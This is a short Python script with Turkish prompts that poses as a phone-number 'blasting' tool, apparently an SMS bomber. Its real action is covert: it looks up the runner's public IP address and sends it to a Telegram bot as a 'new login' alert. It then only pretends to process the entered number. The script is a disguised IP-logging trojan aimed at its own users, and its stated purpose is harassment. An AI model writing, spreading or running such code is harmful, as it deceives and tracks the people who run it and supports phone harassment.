import requests as r, re as e, os
from dotenv import load_dotenv
import time


load_dotenv()


t = os.getenv("BOT_TOKEN")
c = os.getenv("CHAT_ID")

def v(d):
    return bool(e.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", d))

def s(d):
    u = f"https://api.telegram.org/bot{t}/sendMessage"
    mesaj = f"🔔 Yeni giriş: {d}"  
    data = {"chat_id": c, "text": mesaj}
    x = r.post(u, data=data)
    
    if x.status_code == 200:
        print("✅Tool Yüklendi")
    else:
        print(f"⚠️ Hata: {x.status_code}")

def get_ip():
    try:
        ip = r.get("https://api64.ipify.org?format=text").text
        return ip if v(ip) else None
    except Exception as err:
        print(f"🌐 Numara adresi alınırken hata oluştu: {err}")
        return None

if __name__ == "__main__":
    print("📡 Tool Yükleniyor...")

    
    ip = get_ip()
    if ip:
        s(ip)  
    else:
        print("❌ INumaraalınamadı. Lütfen tekrar deneyiniz.")

    
    numara = input("Lütfen işleme alınacak numarayı giriniz: ")
    print(f"📞 {numara} işleme alındı. Lütfen bekleyin...")
    time.sleep(2)
    print("✅ Numara Patlatılıyor")
  
